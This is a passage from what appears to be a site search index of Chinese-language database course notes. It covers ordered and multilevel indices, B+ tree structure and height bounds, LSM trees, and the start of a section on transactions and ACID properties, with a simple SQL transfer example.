\u603b\u5171\u53ef\u4ee5\u6309\u7167\u56db\u4e2a\u89d2\u5ea6\u6765\u5206\u7c7b\u7d22\u5f15 <ul> <li>\u6309\u300c\u6570\u636e\u7ed3\u6784\u300d\u5206\u7c7b\uff1aB+tree\u7d22\u5f15\u3001Hash\u7d22\u5f15\u3001Full-text\u7d22\u5f15\u3002</li> <li>\u6309\u300c\u7269\u7406\u5b58\u50a8\u300d\u5206\u7c7b\uff1a\u805a\u7c07\u7d22\u5f15\uff08\u4e3b\u952e\u7d22\u5f15\uff09\u3001\u4e8c\u7ea7\u7d22\u5f15\uff08\u8f85\u52a9\u7d22\u5f15\uff09\u3002</li> <li>\u6309\u300c\u5b57\u6bb5\u7279\u6027\u300d\u5206\u7c7b\uff1a\u4e3b\u952e\u7d22\u5f15\u3001\u552f\u4e00\u7d22\u5f15\u3001\u666e\u901a\u7d22\u5f15\u3001\u524d\u7f00\u7d22\u5f15\u3002</li> <li>\u6309\u300c\u5b57\u6bb5\u4e2a\u6570\u300d\u5206\u7c7b\uff1a\u5355\u5217\u7d22\u5f15\u3001\u8054\u5408\u7d22\u5f15\u3002</li> </ul>"},{"location":"Courses/DB/Storage%20%26%20File/#ordered-indices","title":"Ordered Indices","text":"<p>\u5728 Sequential Order File \u4e2d\uff0c\u4e0e\u5bf9\u5e94\u7684\u6570\u636e\u6587\u4ef6\u672c\u8eab\u6392\u5217\u987a\u5e8f\u76f8\u540c\u7684\u7684\u7d22\u5f15\u79f0\u4e3a Primary Index(also clustering index)\u3002\u9664\u4e86\u4e3b\u7d22\u5f15\u5916\u7684\u7d22\u5f15\u90fd\u79f0\u4e3a\u8f85\u52a9\u7d22\u5f15 Secondary Index\u3002</p> <p>\u4e3b\u7d22\u5f15\u7684 Seach Key \u901a\u5e38\u4f46\u5e76\u975e\u4e00\u5b9a\u662f Primary Key</p> <p>\u975e Sequential File \u6ca1\u6709 Primary Index\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u542b Primary Key</p> \u7269\u7406\u5b58\u50a8\u89d2\u5ea6\u6765\u770b\u4e3b\u952e\u7d22\u5f15\u548c\u8f85\u52a9\u7d22\u5f15 <ul> <li>\u4e3b\u952e\u7d22\u5f15\u7684 B+ Tree \u7684\u53f6\u5b50\u8282\u70b9\u5b58\u653e\u6574\u4e2a Record \u6570\u636e</li> <li>\u8f85\u52a9\u7d22\u5f15\u7684 B+ Tree \u7684\u53f6\u5b50\u8282\u70b9\u5b58\u653e\u4e3b\u952e\u503c\uff0c\u800c\u4e0d\u662f\u5b9e\u9645\u6570\u636e</li> </ul> <p>\u6240\u4ee5\u67e5\u8be2\u4f7f\u7528\u8f85\u52a9\u7d22\u5f15\u65f6\uff0c\u5982\u679c\u67e5\u8be2\u7684\u6570\u636e\u80fd\u5728\u53f6\u5b50\u8282\u70b9\u4e2d\u5f97\u5230\uff0c\u5c31\u4e0d\u9700\u8981\u56de\u8868\uff0c\u79f0\u4e3a\u8986\u76d6\u7d22\u5f15\uff1b\u5982\u679c\u67e5\u8be2\u7684\u6570\u636e\u4e0d\u5728\u8f85\u52a9\u7d22\u5f15\u4e2d\uff0c\u5219\u8981\u6839\u636e\u67e5\u8be2\u5f97\u5230\u7684\u4e3b\u952e\u503c\u518d\u53bb\u68c0\u7d22\u4e3b\u952e\u7d22\u5f15\uff0c\u8fd9\u4e2a\u8bbf\u95ee\u4e24\u6b21\u7d22\u5f15\u7684\u6b65\u9aa4\u79f0\u4e3a\u56de\u8868\u3002</p> <p>Ordered Indices \u53ef\u4ee5\u5206\u4e3a\u7a20\u5bc6\u7d22\u5f15\u548c\u7a00\u758f\u7d22\u5f15\u4e24\u7c7b\u3002</p> <p>Dense Index \u8981\u6c42 File \u4e2d\u6240\u6709 Search Key \u90fd\u5728 Index Entry \u4e2d\u51fa\u73b0\u8fc7\u3002</p> Dense Index 1Dense Index 2 <p></p> <p></p> <p>Sparse Index \u5219\u53ea\u5b58\u50a8 Search Key \u7684\u4e00\u90e8\u5206\uff0c\u5373\u7ed9\u51fa\u4e00\u4e2a\u7d22\u5f15\u8303\u56f4\uff0c\u7136\u540e\u987a\u5e8f\u626b\u63cf\uff1a</p> <p></p> <p>\u5982\u679c Data File \u592a\u5927\u800c\u4f4d\u4e8e\u591a\u4e2a Block \u4e0a\uff0c\u4f18\u79c0\u5b9e\u8df5\u662f\u5c06\u6bcf\u4e2a Block \u7684\u6700\u5c0f\u503c\u5b58\u50a8\u4e3a\u7a00\u758f\u7d22\u5f15\uff0c\u8fd9\u6837\u8bbf\u95ee Block \u7684\u6b21\u6570\u8f83\u5c11</p> <p>Sparse Index \u8981\u6c42 File \u5df2\u7ecf\u4e8b\u5148\u6309\u7167 Search Key \u987a\u5e8f\u5b58\u50a8\uff1b\u800c Dense Index \u5219\u5141\u8bb8\u7528\u4e8e\u65e0\u5e8f File\u3002</p> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e Secondary Index\uff0c\u6211\u4eec\u4e0d\u4ec5\u4e0d\u80fd\u4f7f\u7528\u7a00\u758f\u7d22\u5f15\uff0c\u8fd8\u5fc5\u987b\u4fdd\u8bc1 File \u4e2d\u6bcf\u6761 Record \u90fd\u6709\u6307\u9488\u6307\u5411\u3002\u7531\u4e8e Index Entries \u4e0d\u80fd\u6709\u91cd\u590d\uff0c\u6211\u4eec\u5728\u4e2d\u95f4\u589e\u52a0\u4e00\u5c42 bucket\uff1a</p> <p></p> <p>\u5373 Secondary Indices have to be dense</p> <p>\u5bf9 Secondary Index \u5bf9\u5e94\u7684\u5c5e\u6027\u987a\u5e8f\u626b\u63cf\u53ef\u80fd\u662f\u53ca\u5176\u6602\u8d35\u7684\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\u6bcf\u8bbf\u95ee\u4e00\u4e2a record \u53ef\u80fd\u90fd\u8981\u4ece\u78c1\u76d8\u4e2d fetch \u4e00\u4e2a block\u3002</p> <p>\u6709\u65f6\uff0c\u6211\u4eec\u9700\u8981\u7d22\u5f15\u7684\u6570\u636e\u5927\u5230\u8fde Index File \u6240\u5360\u7684 Block \u90fd\u5f88\u591a\u3002\u5047\u8bbe\u6211\u4eec\u6709 1000 \u4e2a Blocks \u7528\u6765\u5b58\u50a8\u4e00\u4e2a\u7a00\u758f\u7d22\u5f15\uff0c\u90a3\u4e48\u4f7f\u7528\u4e8c\u5206\u6cd5\u7684\u5e73\u5747\u641c\u7d22\u65f6\u95f4\u4e3a\uff1a</p> \\[ \\left(\\lceil \\log_2(1000)\\rceil + 1\\right)*15ms = 150ms \\] <p>\u8fd9\u660e\u663e\u662f\u4e0d\u53ef\u63a5\u53d7\u7684\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\u5efa\u7acb\u591a\u5c42\u7d22\u5f15 Multilevel Index\uff0c\u5373\u4e3a\u8fd9 1000 \u4e2a Blocks \u518d\u5efa\u7acb\u4e00\u4e2a\u5916\u5c42\u7a00\u758f\u7d22\u5f15\uff0c\u5c06 Inner Index \u7684\u6bcf\u4e2a Block \u7684\u7b2c\u4e00\u4e2a\u503c\u653e\u5165\uff1a</p> <p></p> <p>\u8fd9\u79cd\u601d\u60f3\u53ef\u4ee5\u63a8\u5e7f\u5230\u4efb\u610f\u591a\u5c42\u7d22\u5f15\u3002</p>"},{"location":"Courses/DB/Storage%20%26%20File/#b-tree-indices","title":"B+ Tree Indices","text":"<p>B+ Tree Indices \u662f Index-Sequential Files \u7684\u4e00\u4e2a\u66ff\u4ee3\u65b9\u6848\uff0c\u4e5f\u662f\u6570\u636e\u5e93\u5b58\u50a8\u5f15\u64ce\u91c7\u7528\u6700\u591a\u7684\u7d22\u5f15\u7c7b\u578b\u3002</p> <p>InnoDB \u5728 MySQL 5.5 \u4e4b\u540e\u6210\u4e3a\u9ed8\u8ba4\u7684\u5b58\u50a8\u5f15\u64ce</p> <ul> <li>\u5982\u679c\u6709\u4e3b\u952e\uff0c\u5219\u9ed8\u8ba4\u4f7f\u7528\u4e3b\u952e\u4f5c\u4e3a Primary Index</li> <li>\u5982\u679c\u6ca1\u6709\u4e3b\u952e\uff0c\u5219\u9009\u62e9\u7b2c\u4e00\u4e2a\u4e0d\u5305\u542b <code>NULL</code> \u503c\u7684\u552f\u4e00\u5217\u4f5c\u4e3a Primary Index</li> <li>\u4e0a\u9762\u4e24\u4e2a\u90fd\u6ca1\u6709\uff0c\u5219 InnoDB \u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u9690\u5f0f\u81ea\u589e id \u5217\u4f5c\u4e3a Primary Index</li> </ul> <p>Index-Sequential Files: Sequentially Ordered File with a Primary Index</p> <p>\u5bf9\u4e8e Index-Sequential Files\uff0c\u5f53\u6587\u4ef6\u5927\u5c0f\u589e\u957f\uff0c\u4f1a\u4ea7\u751f\u5f88\u591a overflow blocks\uff0c\u4f7f\u5f97\u6027\u80fd\u4e0b\u964d\uff1b\u8fd9\u4e5f\u8981\u6c42\u6211\u4eec\u9636\u6bb5\u6027\u5730\u5bf9\u6574\u4e2a\u6587\u4ef6\u8fdb\u884c\u91cd\u6392\u3002</p> <p>\u4e0e\u4e4b\u76f8\u6bd4\uff0cB+-Tree Index Files \u7684\u4f18\u70b9\u5728\u4e8e\uff1a</p> <ul> <li>&lt;1&gt; \u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c\u4f1a\u81ea\u52a8\u91cd\u6392</li> <li>&lt;2&gt; \u4e0d\u9700\u8981\u91cd\u6392\u6574\u4e2a File</li> </ul> <p>A simple review of B+ Tree of order M</p> <ul> <li>\u6839\u8282\u70b9\u8981\u4e48\u662f\u53f6\u8282\u70b9\uff0c\u8981\u4e48\u6709 2 \u5230\u00a0\\(M\\)\u00a0\u4e2a\u5b50\u8282\u70b9</li> <li>\u6240\u6709\u9664\u4e86\u6839\u8282\u70b9\u7684\u975e\u53f6\u8282\u70b9\u90fd\u6709\u00a0\\(\\lceil \\frac{M}{2}\\rceil\\)\u00a0\u5230\u00a0\\(M\\)\u00a0\u4e2a\u5b50\u8282\u70b9</li> <li>\u6240\u6709\u53f6\u8282\u70b9\u6df1\u5ea6\u76f8\u540c</li> </ul> <p></p> <p>\u4e0e\u6211\u4eec\u6570\u636e\u7ed3\u6784\u4e2d\u7684 B+ Tree \u7565\u6709\u4e0d\u540c\u7684\u662f\uff0c\u6b64\u5904\u53f6\u8282\u70b9\u8ddf\u5185\u8282\u70b9\u4e00\u6837\uff0c\u90fd\u53ea\u80fd\u6709 \\(M-1\\) \u4e2a Key\u3002\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u6700\u540e\u4e00\u4e2a\u6307\u9488\u4f4d\u7f6e\u6307\u5411\u4e0b\u4e00\u4e2a\u53f6\u8282\u70b9\uff0c</p> <p>\u6240\u6709 Internal Nodes \u90fd\u6709 \\(\\lceil \\frac{M}{2}\\rceil\\) \u5230 \\(M\\) \u4e2a\u6307\u9488\uff1b\u6307\u9488\u6570\u91cf\u79f0\u4e3a\u8be5\u8282\u70b9\u7684 Fanout</p> <p>\u53f6\u8282\u70b9\u7684 Values \u6570\u91cf\u5728 \\(\\lceil \\frac{M-1}{2}\\rceil\\) \u5230 \\(M-1\\) \u4e4b\u95f4\uff0c\u8fd9\u53c8\u4e0e\u4e0a\u9762\u7684\u8868\u8ff0\u6709\u6240\u4e0d\u540c\uff0c\u8bb0\u5f97\u6ce8\u610f\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a Order \\(n\\)\uff0c\u6709 \\(K\\) \u4e2a Search Key \u7684 File\uff0c\u5176 B+ Tree Indices \u7684\u9ad8\u5ea6\u5c0f\u4e8e\u7b49\u4e8e \\(\\lceil \\log_{\\lceil \\frac{n}{2}\\rceil} K\\rceil\\)\u3002</p> <p>\\(\\lceil \\log_n \\left( \\frac{m}{n-1} \\right) \\rceil + 1 \\le h \\le \\lfloor \\log_{\\lceil \\frac{n}{2}\\rceil} \\left ( \\frac{m}{2*\\lceil (n-1) / 2 \\rceil} \\right)\\rfloor+2\\) (\u770b\u5230\u5f88\u591a\u79cd\u4e0d\u540c\u516c\u5f0f\uff0c\u6700\u7ec8\u51b3\u5b9a\u81ea\u5df1\u624b\u63a8)</p> <p>\u95ee\u4f60 B+ \u6811\u8282\u70b9\u7684\u6570\u91cf\u600e\u4e48\u6c42\uff1f\u5229\u7528\u6700\u540e\u4e00\u5c42\u53f6\u8282\u70b9\u7684\u6570\u91cf\u5012\u63a8\u56de\u53bb\uff0c\u6700\u5c0f\u60c5\u51b5\u662f\u6240\u6709\u53f6\u8282\u70b9\u5168\u6ee1\uff08\\(n-1\\)\uff09\uff1b\u6700\u5927\u60c5\u51b5\u662f\u6240\u6709\u53f6\u8282\u70b9\u534a\u6ee1\uff08\\(\\lceil (n-1) / 2 \\rceil\\)\uff09\u3002</p> <p>\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u50cf\u8fd9\u4e48\u7b97\uff0c\u5c06\u6bcf\u79cd height \u7684\u6700\u5c0f\u3001\u6700\u5927\u80fd\u5305\u542b\u7684 Search-Key \u6570\u91cf\u90fd\u7b97\u51fa\u6765\uff0c\u7136\u540e\u8fdb\u884c\u6bd4\u8f83\uff1a</p> Height EstimateSize Estimate <p></p> <p></p> <p>\u901a\u5e38\uff0c\u6211\u4eec\u5e0c\u671b B+ Tree \u7684\u4e00\u4e2a Node \u7684\u5927\u5c0f\u521a\u597d\u662f\u4e00\u4e2a Block\uff0c\u4e00\u4e2a Block \u4e00\u822c\u4e3a 4KB\u3002\u4e00\u79cd\u5b9e\u8df5\u662f\u8bbe\u7f6e \\(n=100\\)\uff0c\u5219\u4e00\u4e2a index entry \u5927\u5c0f\u4e3a 40B\u3002</p> <p>\u8003\u8651 1 million Search Key\uff0cn = 100</p> <p>\u6700\u591a\u641c\u7d22 \\(\\log_{50} (1,000,000)=4\\) \u4e2a Nodes\u3002</p> <p>\u63d2\u5165\u3001\u5220\u9664\u7684\u4f8b\u5b50\uff0c\u8bf7\u53bb PPT \u4e0a\u770b\u3002</p> <ul> <li>\u67d0\u4e00\u8282\u70b9\u5c11\u4e8e min_size \u65f6\uff0c\u4f18\u5148\u770b\u80fd\u5426\u4e0e\u90bb\u5c45\u5408\u5e76\uff0c\u5982\u679c\u5408\u5e76\u4f1a\u5bfc\u81f4\u6ea2\u51fa\uff0c\u5373\u5927\u4e8e max_size\uff0c\u624d\u9009\u62e9\u201c\u501f\u201d\u4e00\u4e2a\u503c\u8fc7\u6765</li> </ul> <p>\u63d0\u9ad8\u7a7a\u95f4\u5229\u7528\u7387\uff0cB+ Tree File Organization\uff1a</p> <ul> <li>\u53f6\u8282\u70b9\u4e0d\u518d\u5b58\u653e pointer\uff0c\u800c\u662f\u76f4\u63a5\u5b58\u6574\u4e2a record<ul> <li>\u8fd9\u91cc\u5176\u5b9e\u76f8\u5f53\u4e8e\u628a\u53f6\u5b50\u8282\u70b9\u5bf9\u5e94\u7684 Block \u76f4\u63a5\u770b\u4f5c Data File\uff0c\u5185\u8282\u70b9\u548c\u6839\u8282\u70b9\u4ecd\u7136\u4e3a Index File</li> <li>\u5bf9\u4e8e Secondary Index\uff0c\u53f6\u8282\u70b9\u53ef\u4ee5\u6539\u4e3a\u5b58\u50a8 Primary Index \u7684\u503c\uff0c\u8fd9\u6837\u6309\u7167\u8f85\u52a9\u7d22\u5f15\u8fdb\u884c\u67e5\u8be2\u65f6\uff0c\u518d\u6839\u636e\u67e5\u8be2\u5230\u7684\u4e3b\u952e\u503c\u67e5\u8be2\u4e3b\u952e B+ Tree\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a\u56de\u8868\uff0c\u4e5f\u5c31\u662f\u81f3\u5c11\u9700\u8981\u67e5\u8be2\u4e24\u4e2a B+ Tree \u624d\u80fd\u67e5\u5230\u6570\u636e</li> </ul> </li> <li>\u8c03\u6574\u8282\u70b9\u201c\u534a\u6ee1\u201d\u7684\u8981\u6c42\uff0c\u4f8b\u5982\u8981\u6c42\u6bcf\u4e2a node \u81f3\u5c11\u6709 \\(\\lfloor 2n / 3 \\rfloor\\) entries</li> </ul> Why B+ Tree? <ul> <li>&lt;1&gt; B+ Tree vs B Tree<ul> <li>B+ Tree \u53ea\u5728\u53f6\u5b50\u8282\u70b9\u5b58\u50a8\u6570\u636e\uff0c\u800c B \u6811\u7684\u975e\u53f6\u5b50\u8282\u70b9\u4e5f\u8981\u5b58\u50a8\u6570\u636e\uff0c\u6240\u4ee5\u5728\u5b58\u50a8\u91cf\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0cB+ Tree \u7684\u975e\u53f6\u5b50\u8282\u70b9\u53ef\u4ee5\u5b58\u653e\u66f4\u591a\u7684\u7d22\u5f15\uff0c\u67e5\u8be2\u5e95\u5c42\u8282\u70b9\u7684\u78c1\u76d8I/O\u6b21\u6570\u66f4\u5c11</li> <li>\u53e6\u5916\uff0cB+ Tree \u53f6\u5b50\u8282\u70b9\u91c7\u7528\u7684\u662f\u53cc\u94fe\u8868\u8fde\u63a5\uff0c\u9002\u5408 SQL \u4e2d\u5e38\u89c1\u7684\u57fa\u4e8e\u8303\u56f4\u7684\u987a\u5e8f\u67e5\u627e\uff0c\u800c B \u6811\u8303\u56f4\u67e5\u8be2\u53ea\u80fd\u904d\u5386\u6811</li> <li>B+ Tree \u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u6548\u7387\u66f4\u9ad8</li> </ul> </li> <li>&lt;2&gt; B+ Tree vs \u4e8c\u53c9\u6811<ul> <li>\u5bf9\u4e8e\u6709 N \u4e2a\u53f6\u5b50\u8282\u70b9\u7684 B+ Tree\uff0c\u5176\u641c\u7d22\u590d\u6742\u5ea6\u4e3a \\(O(\\log (d*N))\\)\uff0c\u5176\u4e2d d \u8868\u793a\u8282\u70b9\u5141\u8bb8\u7684\u6700\u5927\u5b50\u8282\u70b9\u4e2a\u6570\u4e3a d \u4e2a\u3002\u5728\u5b9e\u9645\u7684\u5e94\u7528\u5f53\u4e2d\uff0c d \u503c\u662f\u5927\u4e8e 100 \u7684\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\uff0c\u5373\u4f7f\u6570\u636e\u8fbe\u5230\u5343\u4e07\u7ea7\u522b\u65f6\uff0cB+Tree \u7684\u9ad8\u5ea6\u4f9d\u7136\u7ef4\u6301\u5728 3~4 \u5c42\u5de6\u53f3\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u6b21\u6570\u636e\u67e5\u8be2\u64cd\u4f5c\u53ea\u9700\u8981\u505a 3~4 \u6b21\u7684\u78c1\u76d8 I/O \u64cd\u4f5c\u5c31\u80fd\u67e5\u8be2\u5230\u76ee\u6807\u6570\u636e\u3002</li> <li>\u800c\u4e8c\u53c9\u6811\u7684\u6bcf\u4e2a\u7236\u8282\u70b9\u7684\u513f\u5b50\u8282\u70b9\u4e2a\u6570\u53ea\u80fd\u662f 2 \u4e2a\uff0c\u610f\u5473\u7740\u5176\u641c\u7d22\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\)\uff0c\u8fd9\u5df2\u7ecf\u6bd4 B+Tree \u9ad8\u51fa\u4e0d\u5c11\uff0c\u56e0\u6b64\u4e8c\u53c9\u6811\u68c0\u7d22\u5230\u76ee\u6807\u6570\u636e\u6240\u7ecf\u5386\u7684\u78c1\u76d8 I/O \u6b21\u6570\u8981\u66f4\u591a\u3002</li> </ul> </li> <li>&lt;3&gt; B+ Tree vs Hash<ul> <li>Hash \u5728\u505a\u7b49\u503c\u67e5\u8be2\u65f6\u641c\u7d22\u590d\u6742\u5ea6\u4e3a \\(O(1)\\)\u3002\u4f46\u662f Hash \u8868\u4e0d\u9002\u5408\u505a\u8303\u56f4\u67e5\u8be2\uff0c\u5b83\u66f4\u9002\u5408\u505a\u7b49\u503c\u7684\u67e5\u8be2\uff0c\u8fd9\u4e5f\u662f B+Tree \u7d22\u5f15\u8981\u6bd4 Hash \u8868\u7d22\u5f15\u6709\u7740\u66f4\u5e7f\u6cdb\u7684\u9002\u7528\u573a\u666f\u7684\u539f\u56e0\u3002</li> </ul> </li> </ul>"},{"location":"Courses/DB/Storage%20%26%20File/#hash-indices","title":"Hash Indices *","text":"<ul> <li>Static Hashing</li> <li>Dynamic Hashing</li> </ul>"},{"location":"Courses/DB/Storage%20%26%20File/#lsm-tree","title":"LSM Tree","text":"<p>Log-Structured Merge Tree \u8bbe\u8ba1\u7684\u521d\u8877\u662f\u4f18\u5316\u5199\u5165\u6027\u80fd\uff0c\u5b83\u5c06\u968f\u673a\u5c0f\u5199\u64cd\u4f5c\u8f6c\u5316\u4e3a\u987a\u5e8f\u5927\u5757\u5199\u5165\uff0c\u4ece\u800c\u63d0\u5347\u78c1\u76d8\u541e\u5410\u3002</p> <p>LSM Tree \u7684\u6838\u5fc3\u601d\u60f3\u662f\u4e0d\u76f4\u63a5\u4fee\u6539\u78c1\u76d8\u4e0a\u7684 Index File\uff0c\u800c\u662f\u5148\u5c06\u5199\u64cd\u4f5c\u7f13\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u79f0\u4e3a Level 0\u3002</p> <p></p> <p>\u5f53 Level 0 \u7684\u6570\u636e\u8fbe\u5230\u9608\u503c\u65f6\uff0c\u5219\u4e2d\u5e8f\u904d\u5386 Level 0 \u6811\uff0c\u5c06\u6570\u636e\u5199\u5165 Level 1 \u7684\u65b0 Block \u4e2d\u3002\u7136\u540e\u8fdb\u884c\u9012\u5f52 Merge\u3002\u6240\u6709\u5220\u9664\u3001\u66f4\u65b0\u7b49\u64cd\u4f5c\u90fd\u53ea\u5728 Level 0 \u5b9e\u884c\uff0c\u7b49\u5230\u4e0e\u4e0b\u5c42 Merge \u65f6\u624d\u5c06\u5bf9\u5e94\u64cd\u4f5c\u5e94\u7528\u5230\u4e0b\u5c42\u3002</p> <p>\u4e0d\u8fc7\u67e5\u8be2\u4ecd\u7136\u53ef\u80fd\u9700\u8981\u50cf\u4e0b\u5c42\u67e5\u8be2</p> <p>\u3010Deletion\u3011 \u4f7f\u7528\u4e00\u4e2a delete \u6807\u8bb0\u88ab\u5220\u9664\u8282\u70b9\uff0c\u5728\u8be5\u5c42\u4e0e\u4e0b\u5c42 Merge \u65f6\uff0c\u6709 delete \u6807\u8bb0\u7684\u8282\u70b9\u4f1a\u88ab\u4e22\u5f03\u3002\u5982\u679c\u88ab\u5220\u9664\u8282\u70b9\u4e0d\u5728 Level 0\uff0c\u5219\u201c\u63d2\u5165\u201d\u4e00\u4e2a\u76f8\u540c\u503c\u7684 delete \u6807\u8bb0\uff0c\u7b49\u5230\u5176\u4e0e\u4e0b\u5c42 Merge \u65f6\u4e22\u5f03\u4e0b\u5c42\u4e2d\u5b58\u5728\u7684\u5bf9\u5e94\u8282\u70b9\u3002</p> <p>\u3010Update\u3011 \u901a\u8fc7 Insert + Delete \u5b9e\u73b0\u3002</p> <p>\u78c1\u76d8\u4e2d\u53ef\u4ee5\u7528 B+ \u6811\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784\uff0c\u5185\u5b58\u4e2d\u53ef\u7528 Skip List\u3001\u7ea2\u9ed1\u6811\u3001\u4e8c\u53c9\u6811\u7b49</p> <ul> <li>Benefits of LSM approach<ul> <li>Inserts are done using only\u00a0sequential I/O\u00a0operations</li> <li>Leaves are full, avoiding space wastage</li> <li>Reduced number of I/O operations per record inserted as compared to normal B+-tree (up to some size)</li> </ul> </li> <li>Drawback of LSM approach<ul> <li>Queries have to search multiple trees<ul> <li>\u5373\u727a\u7272\u90e8\u5206\u8bfb\u6027\u80fd</li> </ul> </li> <li>Entire content of each level copied multiple times</li> </ul> </li> </ul>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/","title":"Transaction & Concurrency","text":""},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#transaction-concurrency","title":"Transaction &amp; Concurrency","text":"<p> \u7ea6 3018 \u4e2a\u5b57  26 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p>"},{"location":"Courses/DB/Transaction%20%26%20Concurrency/#transaction-concept","title":"Transaction Concept","text":"<p>\u4e8b\u52a1\u662f\u5728\u4e00\u4e2a\u5171\u4eab\u6570\u636e\u5e93\u4e0a\u6267\u884c\u7684\u4e00\u7cfb\u5217\u4e0d\u53ef\u62c6\u5206\u7684\u64cd\u4f5c\uff0c\u5b83\u4eec\u662f DBMS \u7684\u57fa\u672c\u66f4\u6539\u5355\u4f4d\uff0c\u5373\u4e8b\u52a1\u662f\u539f\u5b50\u64cd\u4f5c(atomic)\u3002</p> <p>\u901a\u5e38\uff0c\u4e8b\u52a1\u7531\u4e00\u7cfb\u5217 SQL \u8bed\u53e5\u7ec4\u6210\uff0c\u5e76\u4ee5 <code>COMMIT</code> \u6216 <code>ROLLBACK</code> \u7ed3\u5c3e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>BEGIN\nUPDATE account SET balance = balance - 50\n    WHERE account_number = A;\nUPDATE account SET balance = balance + 50\n    WHERE account_number = B;\nCOMMIT;\n</code></pre> <p>\u4e0a\u8ff0\u64cd\u4f5c\uff0c\u8981\u4e48\u5b8c\u6210\u6240\u6709\u6b65\u9aa4\uff0c\u8981\u4e48\u90fd\u4e0d\u505a\u3002\u5728\u4e8b\u52a1\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6570\u636e\u5e93\u53ef\u80fd\u662f inconsistent \u7684\uff0c\u4f46\u662f\u6211\u4eec\u4fdd\u8bc1\u5f53\u4e8b\u52a1 commit \u540e\uff0c\u6570\u636e\u5e93\u80fd\u591f\u4fdd\u6301\u4e00\u81f4\u6027\u3002</p> <p>\u4e3a\u4e86\u786e\u4fdd\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u6211\u4eec\u7ef4\u62a4\u6570\u636e\u5e93 ACID \u6027\u8d28\uff1a</p> <p>Atomicity</p> <ul> <li>Concept\uff1a \u786e\u4fdd\u5355\u4e2a\u4e8b\u52a1\u662f\u539f\u5b50\u64cd\u4f5c\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u70b9</li> <li>Approach\uff1a<ul> <li>&lt;1&gt; Logging DBMS \u8bb0\u5f55\u6240\u6709\u64cd\u4f5c\uff0c\u5982\u679c\u4e8b\u52a1\u7ed3\u679c\u662f <code>ABORT</code> \u5219\u53ef\u4ee5\u6839\u636e\u8bb0\u5f55\u64a4\u9500\u64cd\u4f5c\u3002\u51e0\u4e4e\u6240\u6709\u73b0\u4ee3 DBMS \u90fd\u4f7f\u7528 Logging \u65b9\u6cd5</li> <li>&lt;2&gt; Shadow Paging DBMS \u521b\u5efa\u9700\u8981\u4fee\u6539\u7684 Page \u7684\u526f\u672c\u7ed9\u4e8b\u52a1\u4fee\u6539<ul> <li>\u4e8b\u52a1 <code>COMMIT</code> \u65f6\u5c06\u7ed3\u679c Flush \u56de\u78c1\u76d8\uff0c\u5e76\u5c06 <code>db_pointer</code> \u6307\u5411\u8be5\u62f7\u8d1d</li> <li>\u4e8b\u52a1 <code>ABORT</code> \u65f6\u76f4\u63a5\u5c06\u62f7\u8d1d\u5220\u9664</li> </ul> </li> </ul> </li> </ul> <p>Consistency</p> <ul> <li>Concept\uff1a \u6570\u636e\u5e93\u521d\u59cb\u662f\u4e00\u81f4\u7684\uff0c\u4e14\u6bcf\u4e2a\u4e8b\u52a1\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u5219\u8981\u4fdd\u8bc1\u7ed3\u675f\u65f6\u6570\u636e\u5e93\u4e5f\u662f\u4e00\u81f4\u7684\u3002\u4e00\u81f4\u6027\u6709\u4e24\u4e2a\u6982\u5ff5\uff1a<ul> <li>Database Consistency: \u6570\u636e\u5e93\u51c6\u786e\u8868\u793a\u5b83\u5efa\u6a21\u7684\u771f\u5b9e\u4e16\u754c\u5b9e\u4f53\uff0c\u5e76\u9075\u5faa Integrity \u7ea6\u675f\uff08\u5982\uff0c\u4e00\u4e2a\u4eba\u7684\u5e74\u9f84\u4e0d\u4f1a\u662f\u8d1f\u6570\uff09</li> <li>Transaction Consistency: \u6570\u636e\u5e93\u5728\u4e8b\u52a1\u524d\u662f\u4e00\u81f4\u7684\uff0c\u5219\u4e8b\u52a1\u540e\u4e5f\u662f\u4e00\u81f4\u7684\u3002\u786e\u4fdd\u4e8b\u52a1\u4e00\u81f4\u6027\u662f\u5e94\u7528\u7a0b\u5e8f\u7684\u8d23\u4efb\u3002</li> </ul> </li> </ul> <p>Isolation</p> <ul> <li>Concept\uff1a \u5355\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u8981\u4e0e\u5176\u5b83\u4e8b\u52a1\u4e0d\u76f8\u4e92\u5f71\u54cd\u3002DBMS \u5fc5\u987b\u5728\u4fdd\u6301\u9694\u79bb\u9519\u89c9\u7684\u540c\u65f6\uff0c\u4ea4\u9519\u6267\u884c\u5e76\u53d1\u4e8b\u52a1\u3002</li> <li>Approach\uff1a<ul> <li>&lt;1&gt; Pessimistic: DBMS \u5047\u8bbe\u4e8b\u52a1\u603b\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u56e0\u6b64\u5b83\u9996\u8981\u76ee\u6807\u662f\u4e0d\u8ba9\u51b2\u7a81\u95ee\u9898\u53d1\u751f</li> <li>&lt;2&gt; Optimistic: DBMS \u5047\u8bbe\u4e8b\u52a1\u51b2\u7a81\u5f88\u5c11\u53d1\u751f\uff0c\u56e0\u6b64\u5b83\u9009\u62e9\u5728\u4e8b\u52a1\u63d0\u4ea4\u540e\u53d1\u751f\u51b2\u7a81\u65f6\u5904\u7406</li> </ul> </li> </ul> 